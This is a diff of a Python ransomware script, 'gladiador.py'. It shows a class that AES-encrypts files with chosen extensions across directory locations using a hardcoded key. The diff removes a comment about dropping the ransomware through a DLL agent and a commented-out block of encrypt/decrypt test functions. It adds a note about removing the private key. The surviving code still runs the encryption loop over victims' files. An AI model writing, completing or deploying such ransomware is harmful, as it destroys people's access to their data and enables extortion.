@@ -2,12 +2,6 @@ import os ,random,struct
 from Crypto.Cipher import AES 
 import string
 
-'''
-writer.exe agent to DLL to drop this Ransomware 
-
-
-'''
-
 class Gladiador:
 
     def remove_f(self,infile):
@@ -88,6 +82,7 @@ if __name__ == '__main__':
         ".json",
         ".pptx"            
         ]
+    #remover llave privada
     secret = 'this is a key123'.encode("utf-8")
     
     for location in LOCATIONS:
@@ -101,39 +96,4 @@ if __name__ == '__main__':
                     obj = Gladiador(secret,os.path.join(root, file))
                     obj.encrypt()
        
-    '''
-    window_path ="C:\\Users\\antho\\Desktop\\ransomware\\"
-    linux_path="/media/ransomware/"
-    path = window_path
-    
-    
-    def fuckit():
-        for root,dirs,files in os.walk(path):
-            for file in files:
-                x,y = os.path.splitext(path+file)
-                if file == "gladiador.py":
-                    pass
-                elif y.lower() in EXT:
-                    obj = Gladiador(secret,os.path.join(root, file))
-                    obj.encrypt()
-            
-
-
-    def dontFuckit():
-        for root,dirs,files in os.walk(path):
-            for file in files:
-                x,y = os.path.splitext(path+file)
-                if file == "gladiador.py":
-                    pass
-                elif ".encrypted" in file:
-                    obj = Gladiador(secret,os.path.join(root, file))
-                    obj.decrypt()
-    
-    dontFuckit()
-  
-    '''
-            
-      
-
-
-
+   
